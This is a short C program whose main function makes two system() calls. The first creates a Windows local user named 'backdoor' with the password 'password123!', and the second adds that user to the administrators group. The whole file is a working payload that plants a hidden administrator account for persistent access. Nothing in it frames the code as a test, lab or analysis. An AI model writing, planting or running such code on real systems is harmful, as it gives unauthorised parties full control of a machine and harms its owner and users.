#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user backdoor password123! /add");
  i = system ("net localgroup administrators backdoor /add");
  
  return 0;
}
